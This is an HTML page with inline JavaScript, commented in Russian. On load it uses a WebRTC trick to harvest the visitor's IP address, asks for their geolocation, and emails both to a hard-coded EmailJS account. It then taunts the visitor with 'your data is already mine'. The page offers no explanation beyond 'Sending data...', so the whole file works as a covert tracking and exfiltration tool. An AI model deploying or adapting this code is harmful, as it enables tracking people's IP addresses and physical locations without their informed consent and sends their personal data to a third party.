<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP and Location with Anti-Spam</title>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
        })();

        // Получение IP-адреса
        function getUserIP(onNewIP) {
            var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            var pc = new myPeerConnection({
                iceServers: []
            }),
            noop = function() {},
            localIPs = {},
            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g,
            key;

            function iterateIP(ip) {
                if (!localIPs[ip]) onNewIP(ip);
                localIPs[ip] = true;
            }

            pc.createDataChannel("");
            pc.createOffer().then(function(sdp) {
                sdp.sdp.split('\n').forEach(function(line) {
                    if (line.indexOf('candidate') < 0) return;
                    line.match(ipRegex).forEach(iterateIP);
                });
                pc.setLocalDescription(sdp, noop, noop);
            }).catch(function(reason) {});

            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
                ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
            };
        }

        // Отправка данных на почту
        function sendData(userData) {
            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                .then(function(response) {
                    console.log("Email sent successfully", response);
                    alert('Твои данные уже у меня:)');
                    if (userData.location) {
                        markIpAsSent(userData.ip); // Помечаем IP как отправленный с геолокацией
                    }
                }, function(error) {
                    console.error("Failed to send email", error);
                    alert("Ошибка при отправке данных: " + error.text);
                });
        }

        // Проверка, отправлялись ли данные с этого IP
        function isIpAlreadySent(ip) {
            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
            return sentIps[ip] && sentIps[ip].locationSent;
        }

        // Пометка IP как отправленного с геолокацией
        function markIpAsSent(ip) {
            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
            sentIps[ip] = { locationSent: true };
            localStorage.setItem('sentIps', JSON.stringify(sentIps));
        }

        // Основная функция для получения данных пользователя
        function getUserData() {
            getUserIP(function(ip) {
                console.log("Получен IP:", ip);  

                // Проверяем, был ли этот IP уже отправлен с геолокацией
                if (isIpAlreadySent(ip)) {
                    console.log("Этот IP уже отправлял данные с геолокацией. Отправка отменена.");
                    return;
                }

                let userData = { ip: ip };

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        userData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        console.log("Геолокация получена:", userData.location);
                        sendData(userData);
                    }, function(error) {
                        alert('Ошибка при получении геолокации: ' + error.message);
                        sendData(userData);  // Отправка данных только с IP
                    });
                } else {
                    alert("Геолокация не поддерживается этим браузером.");
                    sendData(userData);  // Отправка данных только с IP
                }
            });
        }

        window.onload = function() {
            getUserData();
        }
    </script>
</head>
<body>
    <h1>Отправка данных...</h1>
</body>
</html>